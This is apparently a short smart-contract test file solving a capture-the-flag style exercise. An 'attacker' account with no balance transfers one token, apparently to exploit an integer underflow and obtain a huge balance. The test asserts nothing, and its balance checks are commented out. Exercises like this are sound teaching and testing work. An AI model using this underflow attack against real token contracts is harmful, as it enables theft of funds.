
import { accounts, contract } from '@openzeppelin/test-environment';
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Token = contract.fromArtifact('Token');
let token: any;

beforeEach(async () => {
    token = await Token.new(10000, { from: owner });
});

it('Token -> goten a large amount of tokens', async () => {

    //console.log('before', (await token.balanceOf(attacker)).toString());
    await token.transfer(owner, 1, { from: attacker });
    //console.log('after', (await token.balanceOf(attacker)).toString());
});

